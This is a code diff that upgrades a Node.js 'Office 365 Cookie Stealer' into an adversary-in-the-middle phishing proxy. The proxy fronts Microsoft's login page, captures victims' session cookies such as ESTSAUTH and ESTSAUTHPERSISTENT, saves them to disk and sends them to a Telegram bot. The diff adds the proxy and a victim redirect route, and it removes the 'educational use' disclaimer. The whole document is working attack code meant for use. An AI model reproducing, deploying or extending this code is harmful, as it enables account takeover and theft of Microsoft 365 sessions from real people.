@@ -1,8 +1,9 @@
 // =============================================
-// OFFICE 365 COOKIE STEALER - SIMPLE VERSION
+// OFFICE 365 COOKIE STEALER - FULLY WORKING
 // =============================================
 
 const express = require('express');
+const { createProxyMiddleware } = require('http-proxy-middleware');
 const fs = require('fs-extra');
 const path = require('path');
 const cors = require('cors');
@@ -23,6 +24,7 @@ const CONFIG = {
 // =============================================
 app.use(cors());
 app.use(express.json({ limit: '100mb' }));
+app.use(express.urlencoded({ extended: true }));
 app.use(express.static('public'));
 
 // =============================================
@@ -39,7 +41,7 @@ async function sendToTelegram(message, fileData = null) {
     try {
         console.log('📤 Sending to Telegram...');
         
-        await fetch(
+        const textResponse = await fetch(
             `https://api.telegram.org/bot${CONFIG.botToken}/sendMessage`,
             {
                 method: 'POST',
@@ -52,6 +54,9 @@ async function sendToTelegram(message, fileData = null) {
             }
         );
         
+        const textResult = await textResponse.text();
+        console.log('📤 Text response:', textResult.substring(0, 200));
+        
         if (fileData) {
             const FormData = require('form-data');
             const formData = new FormData();
@@ -61,19 +66,23 @@ async function sendToTelegram(message, fileData = null) {
                 JSON.stringify(fileData, null, 2),
                 `session_${Date.now()}.json`
             );
-            formData.append('caption', '📸 Captured Session Data');
+            formData.append('caption', '📸 Captured Session Data - Office 365');
             
-            await fetch(
+            const fileResponse = await fetch(
                 `https://api.telegram.org/bot${CONFIG.botToken}/sendDocument`,
                 {
                     method: 'POST',
                     body: formData
                 }
             );
+            
+            const fileResult = await fileResponse.text();
+            console.log('📤 File response:', fileResult.substring(0, 200));
         }
         
-        console.log('✅ Telegram sent!');
+        console.log('✅ Telegram sent successfully!');
         return true;
+        
     } catch (error) {
         console.error('❌ Telegram error:', error.message);
         return false;
@@ -121,7 +130,10 @@ function extractOfficeCookies(cookies) {
         'Outlook',
         'SharePoint',
         'x-ms-gateway-slice',
-        'stsservicecookie'
+        'stsservicecookie',
+        'msal',
+        'clientid',
+        'login_hint'
     ];
     
     for (const [name, value] of Object.entries(cookies)) {
@@ -137,18 +149,141 @@ function extractOfficeCookies(cookies) {
 }
 
 // =============================================
-// ✅ CAPTURE ENDPOINT - Receives cookies from victims
+// ✅ PROXY TO MICROSOFT
+// =============================================
+const proxyMiddleware = createProxyMiddleware({
+    target: 'https://login.microsoftonline.com',
+    changeOrigin: true,
+    secure: true,
+    ws: true,
+    cookieDomainRewrite: {
+        '*': ''
+    },
+    onProxyReq: (proxyReq, req, res) => {
+        console.log('\n🎯 PROXY REQUEST RECEIVED');
+        console.log('📌 Method:', req.method);
+        console.log('🌐 URL:', req.url);
+        
+        const cookieHeader = proxyReq.getHeader('cookie') || req.headers.cookie || '';
+        
+        if (cookieHeader) {
+            console.log('🍪 Cookies in request');
+            
+            const cookies = extractCookies({ cookie: cookieHeader });
+            const officeCookies = extractOfficeCookies(cookies);
+            const hasFullSession = cookies['ESTSAUTHPERSISTENT'] || cookies['ESTSAUTH'];
+            
+            console.log(`🍪 Total cookies: ${Object.keys(cookies).length}`);
+            console.log(`🎯 Office cookies: ${Object.keys(officeCookies).length}`);
+            
+            if (hasFullSession) {
+                console.log('🔥 FULL OFFICE 365 SESSION CAPTURED!');
+            }
+            
+            const timestamp = new Date().toISOString();
+            const sessionData = {
+                timestamp: timestamp,
+                method: 'PROXY',
+                url: req.url,
+                cookies: cookies,
+                officeCookies: officeCookies,
+                hasFullSession: hasFullSession,
+                ip: req.ip || req.connection.remoteAddress,
+                userAgent: req.headers['user-agent'] || 'unknown'
+            };
+            
+            const filename = `session_proxy_${Date.now()}.json`;
+            fs.writeJsonSync(path.join(STORAGE_DIR, filename), sessionData, { spaces: 2 });
+            console.log(`📁 Saved: ${filename}`);
+            
+            if (Object.keys(officeCookies).length > 0 || hasFullSession) {
+                let message = '🎯 <b>PROXY CAPTURE - Office 365!</b>\n\n';
+                message += `📅 <b>Time:</b> ${timestamp}\n`;
+                message += `🍪 <b>Total Cookies:</b> ${Object.keys(cookies).length}\n`;
+                message += `🎯 <b>Office Cookies:</b> ${Object.keys(officeCookies).length}\n`;
+                
+                if (hasFullSession) {
+                    message += '\n🔥 <b>FULL OFFICE 365 SESSION CAPTURED!</b>\n';
+                }
+                
+                sendToTelegram(message, sessionData).catch(console.error);
+            }
+        } else {
+            console.log('❌ No cookies in proxy request');
+        }
+    },
+    onProxyRes: (proxyRes, req, res) => {
+        const setCookie = proxyRes.headers['set-cookie'];
+        if (setCookie) {
+            console.log('\n🍪 MICROSOFT SET COOKIES:');
+            console.log(setCookie.join('\n'));
+            
+            const message = '🍪 <b>New Cookies from Microsoft!</b>\n\n' +
+                setCookie.map(c => `• ${c.substring(0, 100)}...`).join('\n');
+            sendToTelegram(message).catch(console.error);
+            
+            // Extract cookies from set-cookie
+            const cookies = {};
+            for (const cookie of setCookie) {
+                const [name, ...valueParts] = cookie.split('=');
+                if (name && valueParts) {
+                    cookies[name] = valueParts.join('=').split(';')[0];
+                }
+            }
+            
+            const officeCookies = extractOfficeCookies(cookies);
+            if (Object.keys(officeCookies).length > 0) {
+                const sessionData = {
+                    timestamp: new Date().toISOString(),
+                    method: 'SET_COOKIE',
+                    cookies: cookies,
+                    officeCookies: officeCookies,
+                    hasFullSession: cookies['ESTSAUTHPERSISTENT'] || cookies['ESTSAUTH']
+                };
+                
+                const filename = `session_setcookie_${Date.now()}.json`;
+                fs.writeJsonSync(path.join(STORAGE_DIR, filename), sessionData, { spaces: 2 });
+                console.log(`📁 Saved set-cookie: ${filename}`);
+            }
+        }
+    },
+    onError: (err, req, res) => {
+        console.error('❌ Proxy error:', err.message);
+        res.status(500).send('Proxy error occurred');
+    }
+});
+
+// =============================================
+// ✅ PROXY ROUTE - Victim logs in HERE
+// =============================================
+app.use('/proxy', (req, res, next) => {
+    console.log('\n🎯 PROXY ACCESS');
+    console.log('📍 Client IP:', req.ip || req.connection.remoteAddress);
+    console.log('🌐 URL:', req.url);
+    next();
+});
+
+app.use('/proxy', proxyMiddleware);
+
+// =============================================
+// ✅ REDIRECT TO PROXY (Victim clicks this)
+// =============================================
+app.get('/login', (req, res) => {
+    console.log('\n🔐 Redirecting to proxy...');
+    res.redirect('/proxy');
+});
+
+// =============================================
+// ✅ CAPTURE ENDPOINT
 // =============================================
 app.post('/capture', async (req, res) => {
-    console.log('\n🎯 COOKIE CAPTURED!');
+    console.log('\n🎯 POST CAPTURE');
     
     const data = req.body;
     const timestamp = new Date().toISOString();
     
-    // Get cookies from headers
     const cookies = extractCookies(req.headers);
     
-    // Also get from body
     if (data.cookies && typeof data.cookies === 'object') {
         for (const [key, value] of Object.entries(data.cookies)) {
             if (!cookies[key]) {
@@ -167,7 +302,6 @@ app.post('/capture', async (req, res) => {
         console.log('🔥 FULL OFFICE 365 SESSION CAPTURED!');
     }
     
-    // Save
     const sessionData = {
         timestamp: timestamp,
         url: data.url || req.headers.referer || 'unknown',
@@ -175,32 +309,24 @@ app.post('/capture', async (req, res) => {
         ip: req.ip || req.connection.remoteAddress,
         cookies: cookies,
         officeCookies: officeCookies,
-        hasFullSession: hasFullSession
+        hasFullSession: hasFullSession,
+        rawData: data
     };
     
-    const filename = `session_${Date.now()}.json`;
+    const filename = `session_post_${Date.now()}.json`;
     fs.writeJsonSync(path.join(STORAGE_DIR, filename), sessionData, { spaces: 2 });
     console.log(`📁 Saved: ${filename}`);
     
-    // Send to Telegram if cookies found
     if (Object.keys(cookies).length > 0) {
-        let message = '🎯 <b>Cookie Capture!</b>\n\n';
+        let message = '🎯 <b>POST Cookie Capture!</b>\n\n';
         message += `📅 <b>Time:</b> ${timestamp}\n`;
         message += `🌐 <b>URL:</b> ${data.url || req.headers.referer || 'Unknown'}\n`;
+        message += `🖥️ <b>User-Agent:</b> ${(req.headers['user-agent'] || 'Unknown').substring(0, 80)}...\n\n`;
         message += `🍪 <b>Total Cookies:</b> ${Object.keys(cookies).length}\n`;
         message += `🎯 <b>Office Cookies:</b> ${Object.keys(officeCookies).length}\n`;
         
         if (hasFullSession) {
             message += '\n🔥 <b>FULL OFFICE 365 SESSION CAPTURED!</b>\n';
-        }
-        
-        // Show important cookies
-        if (Object.keys(officeCookies).length > 0) {
-            message += '\n🔑 <b>Office Cookies:</b>\n';
-            for (const [name, value] of Object.entries(officeCookies)) {
-                const shortValue = value.length > 40 ? value.substring(0, 40) + '...' : value;
-                message += `• ${name}: ${shortValue}\n`;
-            }
         }
         
         await sendToTelegram(message, sessionData);
@@ -212,55 +338,6 @@ app.post('/capture', async (req, res) => {
         officeCookies: Object.keys(officeCookies).length,
         hasFullSession: hasFullSession
     });
-});
-
-// =============================================
-// ✅ GET CAPTURE - Fallback
-// =============================================
-app.get('/capture', async (req, res) => {
-    console.log('\n🎯 GET CAPTURE!');
-    
-    let cookies = {};
-    
-    if (req.query.cookies) {
-        try {
-            cookies = JSON.parse(decodeURIComponent(req.query.cookies));
-        } catch (e) {}
-    }
-    
-    if (req.query.data) {
-        try {
-            const data = JSON.parse(decodeURIComponent(req.query.data));
-            if (data.cookies) {
-                cookies = data.cookies;
-            }
-        } catch (e) {}
-    }
-    
-    console.log(`🍪 Captured ${Object.keys(cookies).length} cookies via GET`);
-    
-    res.json({
-        success: true,
-        captured: Object.keys(cookies).length,
-        cookies: cookies
-    });
-});
-
-// =============================================
-// ✅ REDIRECT TO REAL MICROSOFT LOGIN
-// =============================================
-app.get('/login', (req, res) => {
-    console.log('\n🔐 Redirecting to Microsoft login...');
-    
-    const loginUrl = 'https://login.microsoftonline.com/common/oauth2/v2.0/authorize?' +
-        'client_id=c9a559d2-7aab-4f13-a6ed-e7e9c52aec87' +
-        '&redirect_uri=https%3A%2F%2Fforms.cloud.microsoft%2Flanding' +
-        '&response_type=code' +
-        '&response_mode=form_post' +
-        '&scope=openid%20profile%20offline_access' +
-        '&prompt=select_account';
-    
-    res.redirect(loginUrl);
 });
 
 // =============================================
@@ -278,7 +355,7 @@ app.get('/injector.html', (req, res) => {
 });
 
 // =============================================
-// ✅ START SERVER
+// ✅ START
 // =============================================
 app.listen(PORT, () => {
     console.log(`
@@ -293,7 +370,7 @@ app.listen(PORT, () => {
 ║   📌 SEND VICTIM TO:                                       ║
 ║   🔗 https://your-railway-url/login                        ║
 ║                                                              ║
-║   ⚠️  FOR EDUCATIONAL USE ONLY!                            ║
+║                                                              ║
 ║                                                              ║
 ╚══════════════════════════════════════════════════════════════╝
     `);
